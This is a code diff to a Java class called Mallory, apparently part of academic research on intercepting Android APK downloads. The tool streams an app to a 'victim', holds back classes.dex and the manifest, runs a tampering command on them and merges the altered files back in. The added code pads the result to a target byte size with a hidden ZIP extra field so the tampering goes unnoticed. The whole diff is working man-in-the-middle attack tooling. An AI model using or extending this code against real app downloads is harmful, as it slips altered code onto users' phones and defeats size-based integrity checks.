@@ -17,6 +17,7 @@
 
 package cz.muni.fi.xklinec.zipstream;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
@@ -30,10 +31,12 @@ import java.util.List;
 import java.util.Map;
 import java.util.zip.Deflater;
 import org.apache.commons.compress.archivers.zip.UnparseableExtraFieldData;
+import org.apache.commons.compress.archivers.zip.UnrecognizedExtraField;
 import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
 import org.apache.commons.compress.archivers.zip.ZipArchiveInputStream;
 import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;
 import org.apache.commons.compress.archivers.zip.ZipExtraField;
+import org.apache.commons.compress.archivers.zip.ZipShort;
 import org.apache.commons.io.FileUtils;
 import org.bouncycastle.util.io.TeeInputStream;
 import org.kohsuke.args4j.Argument;
@@ -51,6 +54,16 @@ public class Mallory {
     public static final String INPUT_APK_PLACEHOLDER = "<<INPUTAPK>>";
     public static final String OUTPUT_APK_PLACEHOLDER = "<<OUTPUTAPK>>";
     
+    public static final int END_OF_CENTRAL_DIR_SIZE = 22;
+    public static final int EXTRA_FIELD_SIZE = 8;
+    public static final int MAX_EXTRA_SIZE = 65535;
+    
+    public static final int DEFAULT_PADDING_EXTRA = 4096;
+    
+    public static final String ANDROID_MANIFEST = "AndroidManifest.xml";
+    public static final String CLASSES = "classes.dex";
+    public static final String META_INF = "META-INF";
+    
     // receives other command line parameters than options
     @Argument
     private final List<String> arguments = new ArrayList<String>(8);
@@ -65,7 +78,7 @@ public class Mallory {
             + "\n2=as 1 + output apk is substituted for placeholder " + OUTPUT_APK_PLACEHOLDER)
     private int cmdFormat=0;
     
-    @Option(name = "--out", aliases = {"-o"}, usage = "New APK file after tampering is finished.")
+    @Option(name = "--out", aliases = {"-o"}, usage = "Tampered APK filename (after tampering is finished, this is read for diff.).")
     private String outFile;
     
     @Option(name = "--quiet", aliases = {"-q"}, usage = "No output on stderr.")
@@ -74,8 +87,11 @@ public class Mallory {
     @Option(name = "--zip-align", aliases = {"-z"}, usage = "Apply ZIP align on resulting APK (stream output).")
     private boolean zipAlign = false;
     
-    @Option(name = "--output-size", aliases = {"-s"}, usage = "Desired size of the resulting APK in bytes.")
+    @Option(name = "--output-size", aliases = {"-s"}, usage = "Desired size of the resulting APK in bytes. By default size(original_APK)+"+DEFAULT_PADDING_EXTRA+".")
     private long outBytes = 0;
+    
+    @Option(name = "--padd-extra", aliases = {"-p"}, usage = "Desired padding of the resulting APK in bytes. Is used only if output-size is zero.\nsize(out_APK) = size(original_APK) + padd_extra.")
+    private long paddExtra = DEFAULT_PADDING_EXTRA;
     
     private static Mallory runningInstance;
     public static void main(String[] args) {
@@ -90,6 +106,18 @@ public class Mallory {
         }
     }
     
+    private OutputStream fos = null;
+    private InputStream  fis = null;
+    private Deflater def;
+    private ZipArchiveInputStream zip;
+    private ZipArchiveOutputStream zop;
+    private File newApk;
+    private File tempApk;
+    
+    private Map<String, PostponedEntry> alMap;
+    private List<PostponedEntry> peList;
+    private List<PostponedEntry> prList;
+    
     /**
      * Entry point. 
      * 
@@ -100,11 +128,8 @@ public class Mallory {
      * @throws ClassNotFoundException
      * @throws NoSuchMethodException 
      */
-    public void doMain( String[] args ) throws FileNotFoundException, IOException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InterruptedException
+    public void doMain( String[] args ) throws FileNotFoundException, IOException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InterruptedException, CloneNotSupportedException
     {   
-        OutputStream fos = null;
-        InputStream  fis = null;
-        
         // command line argument parser
         CmdLineParser parser = new CmdLineParser(this);
 
@@ -150,16 +175,11 @@ public class Mallory {
             return;
         }
         
-        if (outBytes!=0){
-            System.err.println("WARNING: Padding to output length not implemented yet...");
-            return;
-        }
-        
         // Deflater to re-compress uncompressed data read from ZIP stream.
-        final Deflater def = new Deflater(9, true);
+        def = new Deflater(9, true);
         
         // Generate temporary APK filename
-        File tempApk = File.createTempFile(TEMP_DIR + "_temp_apk", ".apk");
+        tempApk = File.createTempFile(TEMP_DIR + "_temp_apk", ".apk");
         FileOutputStream tos = new FileOutputStream(tempApk);
         
         // What we want here is to read input stream from the socket/pipe 
@@ -170,17 +190,17 @@ public class Mallory {
         
         // Providing tis to ZipArchiveInputStream will copy all read data
         // to temporary tos file.
-        ZipArchiveInputStream zip = new ZipArchiveInputStream(tis);
+        zip = new ZipArchiveInputStream(tis);
         
         // List of all sent files, with data and hashes
-        Map<String, PostponedEntry> alMap = new HashMap<String, PostponedEntry>();
+        alMap = new HashMap<String, PostponedEntry>();
         // List of postponed entries for further "processing".
-        List<PostponedEntry> peList = new ArrayList<PostponedEntry>(6);
+        peList = new ArrayList<PostponedEntry>(6);
         // Priority postponed entries - at the end of the archive.
-        List<PostponedEntry> prList = new ArrayList<PostponedEntry>(6);
+        prList = new ArrayList<PostponedEntry>(6);
         
         // Output stream
-        ZipArchiveOutputStream zop = new ZipArchiveOutputStream(fos);
+        zop = new ZipArchiveOutputStream(fos);
         zop.setLevel(9);
         
         // Read the archive
@@ -191,7 +211,7 @@ public class Mallory {
             byte[] lextra = ze.getLocalFileDataExtra();
             UnparseableExtraFieldData uextra = ze.getUnparseableExtraFieldData();
             byte[] uextrab = uextra != null ? uextra.getLocalFileDataData() : null;
-            
+            byte[] ex = ze.getExtra();
             // ZipArchiveOutputStream.DEFLATED
             // 
             
@@ -216,9 +236,9 @@ public class Mallory {
             }
             
             if (!quiet)
-            System.err.println(String.format("ZipEntry: meth=%d "
+                System.err.println(String.format("ZipEntry: meth=%d "
                     + "size=%010d isDir=%5s "
-                    + "compressed=%07d extra=%d lextra=%d uextra=%d "
+                    + "compressed=%07d extra=%d lextra=%d uextra=%d ex=%d "
                     + "comment=[%s] "
                     + "dataDesc=%s "
                     + "UTF8=%s "
@@ -230,6 +250,7 @@ public class Mallory {
                     extra!=null  ?  extra.length : -1,
                     lextra!=null ? lextra.length : -1,
                     uextrab!=null ? uextrab.length : -1,
+                    ex!=null ? ex.length : -1,
                     ze.getComment(),
                     ze.getGeneralPurposeBit().usesDataDescriptor(),
                     ze.getGeneralPurposeBit().usesUTF8ForNames(),
@@ -245,16 +266,16 @@ public class Mallory {
             
             // META-INF files should be always on the end of the archive, 
             // thus add postponed files right before them
-            if (curName.startsWith("META-INF")){
+            if (curName.startsWith(META_INF)){
                 // Add to priority postponed data (meta inf files @ the end of the file).
                 PostponedEntry pr = new PostponedEntry(ze, byteData, deflData);
                 prList.add(pr);
-            }
-            
-            // Capturing interesting files for us and store for later.
-            // If the file is not interesting, send directly to the stream.
-            if ("classes.dex".equalsIgnoreCase(curName)
-                 || "AndroidManifest.xml".equalsIgnoreCase(curName)){
+                
+            } else if (CLASSES.equalsIgnoreCase(curName)
+                 || ANDROID_MANIFEST.equalsIgnoreCase(curName)){
+                
+                // Capturing interesting files for us and store for later.
+                // If the file is not interesting, send directly to the stream.
                 
                  if (!quiet)
                     System.err.println("### Interesting file, postpone sending!!!");
@@ -278,16 +299,22 @@ public class Mallory {
         tis.close();
         tos.close();
         
+        //
         // APK is finished here, all non-interesting files were sent to the 
         // zop strem (socket to the victim). Now APK transformation will
         // be performed, diff, sending rest of the files to zop.
         // 
+        long flen = tempApk.length();
+        if (outBytes<=0){
+            outBytes = flen + paddExtra;
+        }
+        
         if (!quiet)
             System.err.println("APK reading finished, going to tamper downloaded "
-                + " APK file ["+tempApk.toString()+"]; filezise=["+tempApk.length()+"]");
+                + " APK file ["+tempApk.toString()+"]; filezise=["+flen+"]");
         
         // New APK was generated, new filename = "tempApk_tampered"
-        File newApk = new File(outFile==null ? getFileName(tempApk.getAbsolutePath()) : outFile);
+        newApk = new File(outFile==null ? getFileName(tempApk.getAbsolutePath()) : outFile);
         
         if (cmd==null){
             // Simulation of doing some evil stuff on the temporary apk
@@ -331,13 +358,129 @@ public class Mallory {
         }
         
         //
-        // Now read new APK file with ZipInputStream and push new files to the ZOP
+        // Now read new APK file with ZipInputStream and push new/modified files to the ZOP
         //
         fis = new FileInputStream(newApk);
         zip = new ZipArchiveInputStream(fis);
         
-        // Read the archive
-        ze = zip.getNextZipEntry();
+        // Merge tampered APK to the final, but in this first time
+        // do it to the external buffer in order to get final apk size.
+        // Copy state of the ZOP to the external variables. 
+        zop.flush();
+        
+        long writtenBeforeDiff = zop.getWritten();
+        OutputStream cout = zop.getOut();
+        
+        ZipArchiveOutputStream zop_back = zop;
+        zop = zop.cloneThis();
+        
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        zop.setOut(bos);
+        
+        mergeTamperedApk();
+        zop.flush();
+        
+        // Now output stream almost contains APK file, central directory is not written yet.
+        long writtenAfterDiff = zop.getWritten();
+        
+        if (!quiet)
+            System.err.println(String.format("Tampered apk size yet; writtenBeforeDiff=%d writtenAfterDiff=%d", writtenBeforeDiff, writtenAfterDiff));
+        
+        // Write central directory header to temporary buffer to discover its size.
+        zop.writeFinish();
+        zop.flush();
+        bos.flush();
+        
+        // Read new values
+        long writtenAfterCentralDir = zop.getWritten();
+        long centralDirLen = zop.getCdLength();
+        byte[] buffAfterMerge =  bos.toByteArray(); 
+        int endOfCentralDir = (int) (buffAfterMerge.length - (writtenAfterCentralDir-writtenBeforeDiff));
+        
+        // Determine number of bytes to add to APK.
+        int padlen = (int) (outBytes - (writtenAfterCentralDir + endOfCentralDir) - EXTRA_FIELD_SIZE);
+        if (!quiet)
+            System.err.println(String.format("Remaining to pad=%d, writtenAfterCentralDir=%d "
+                    + "centralDir=%d endOfCentralDir=%d centralDirOffset=%d "
+                    + "buffSize=%d total=%d desired=%d ", 
+                    padlen, writtenAfterCentralDir, 
+                    centralDirLen, endOfCentralDir, 
+                    zop.getCdOffset(), buffAfterMerge.length, 
+                    writtenAfterCentralDir + endOfCentralDir, outBytes));
+        
+        // Max extra is 65535 bytes, assume we are right
+        if (padlen > MAX_EXTRA_SIZE){
+            throw new IllegalStateException("I assume pad length is less than max extra size");
+        }
+        
+        if (padlen < 0){
+            throw new IllegalStateException("Padlen cannot be negative, please increase padding size");
+        }
+        
+        // Add padd size to file comment to central file directory, muhehe
+        PostponedEntry mpe = this.alMap.get(ANDROID_MANIFEST);
+        
+        byte[] paddBuff = new byte[padlen];
+        UnrecognizedExtraField zextra =  new UnrecognizedExtraField();
+        zextra.setHeaderId(new ZipShort(0x123456));
+        zextra.setLocalFileDataData(new byte[0]);
+        zextra.setCentralDirectoryData(paddBuff);
+        
+        mpe.ze.addExtraField(zextra);
+        
+        //final String curComment = mpe.ze.getComment();
+        //mpe.ze.setComment((curComment==null ? "" : curComment));// + (new String(new char[padlen]).replace('\0', ' ')));
+        if (!quiet)
+            System.err.println(String.format("Padding added to manifest comments [%s]", mpe.ze.getComment()));
+        
+        // Merge again, now with pre-defined pad comment size.
+        fis = new FileInputStream(newApk);
+        zip = new ZipArchiveInputStream(fis);
+        // Revert changes - use clonned writer stream.
+        zop = zop_back;
+        
+        long writtenBeforeDiff2 = zop.getWritten();
+        
+        // Merge tampered APK, now for real.
+        mergeTamperedApk();
+        zop.flush();
+        
+        long writtenAfterMerge2 = zop.getWritten();
+        
+        // Finish really        
+        zop.finish();
+        zop.flush();
+        
+        long writtenReally = zop.getWritten();
+        long centralDirLen2 = zop.getCdLength();
+        
+        if (!quiet)
+            System.err.println(String.format("Write stats; "
+                    + "writtenBeforeDiff=%d writtenAfterDiff=%d "
+                    + "writtenAfterCentralDir=%d centralDir=%d endOfCd=%d centralDirOffset=%d "
+                    + "padlen=%d total=%d desired=%d", 
+                    writtenBeforeDiff2, writtenAfterMerge2, 
+                    writtenReally, centralDirLen2, endOfCentralDir, zop.getCdOffset(),
+                    padlen, writtenReally + endOfCentralDir, outBytes));
+        
+        zop.close();
+        fos.close();
+        
+        if (!quiet)
+            System.err.println( "THE END!" );
+    }
+    
+    /**
+     * Reads tampered APK file (zip object is prepared for this file prior 
+     * this function call).
+     * 
+     * If some file differs, newly created file is merged to the output zip stream.
+     * 
+     * @throws IOException 
+     */
+    public void mergeTamperedApk() throws IOException{
+        // Read the tampered archive
+        ZipArchiveEntry ze = zip.getNextZipEntry();
         while(ze!=null){
             
             // Data for entry
@@ -367,7 +510,7 @@ public class Mallory {
                 // This element is not in the archive at all! 
                 // Add it to the zop
                 if (!quiet)
-                    System.err.println("Detected newly added file ["+curName+"]");
+                    System.err.println("Detected newly added file ["+curName+"] written prior dump: " + zop.getWritten());
                 
                 al.dump(zop);
             }
@@ -381,36 +524,44 @@ public class Mallory {
                 // Element was changed, add it to the zop 
                 // 
                 if (!quiet)
-                    System.err.println("Detected modified file ["+curName+"]");
+                    System.err.println("Detected modified file ["+curName+"] written prior dump: " + zop.getWritten());
+                
+                // If manifest is changed, add comments.
+                if (ANDROID_MANIFEST.equalsIgnoreCase(curName)){
+                    ZipExtraField[] extraFields = oldEntry.ze.getExtraFields(true);
+                    al.ze.setExtraFields(extraFields);
+                }
                 
                 al.dump(zop);
                 
-            } else if (curName.startsWith("META-INF")
-                    || "classes.dex".equalsIgnoreCase(curName)
-                    || "AndroidManifest.xml".equalsIgnoreCase(curName)){
+            } else if (curName.startsWith(META_INF)
+                    || CLASSES.equalsIgnoreCase(curName)
+                    || ANDROID_MANIFEST.equalsIgnoreCase(curName)){
                 // File was not modified but is one of the postponed files, thus has to 
                 // be flushed also.
                 if (!quiet)
-                    System.err.println("Postponed file not modified ["+curName+"]");
+                    System.err.println("Postponed file not modified ["+curName+"] written prior dump: " + zop.getWritten());
+                
+                // If manifest is changed, add comments.
+                if (ANDROID_MANIFEST.equalsIgnoreCase(curName)){
+                    ZipExtraField[] extraFields = oldEntry.ze.getExtraFields(true);
+                    al.ze.setExtraFields(extraFields);
+                }
                 
                 al.dump(zop);
-                
             }
             
             ze = zip.getNextZipEntry();
         }
-        
-        if (!quiet)
-            System.err.println("Reading tampered APK finished, ZipOutputStream is now complete. Closing...");
-        
-        zop.finish();
-        zop.close();
-        fos.close();
-        
-        if (!quiet)
-            System.err.println( "THE END!" );
     }
     
+    /**
+     * Returns filename for modified apk according to scheme below.
+     * original_file.apk --> original_file_mod.apk
+     * 
+     * @param name
+     * @return 
+     */
     public String getFileName(String name){
         if (name.endsWith(".apk")==false){
             throw new IllegalArgumentException("Filename has to end on .apk");
